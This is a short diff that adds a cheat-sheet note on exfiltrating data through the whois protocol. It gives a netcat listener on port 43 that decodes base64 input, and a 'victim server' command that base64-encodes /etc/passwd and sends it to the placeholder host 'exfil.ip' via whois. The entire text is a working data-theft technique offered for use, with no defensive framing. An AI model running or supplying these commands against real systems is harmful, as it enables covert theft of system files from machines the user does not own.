@@ -1,0 +1,7 @@
+// Use whois to exfil data from a target server
+
+Listening Server:
+  nc -lvp 43 | sed "s //g" | base64 -d
+
+Victim Server:
+  whois -h exfil.ip -p 43 `cat /etc/passwd | base64`
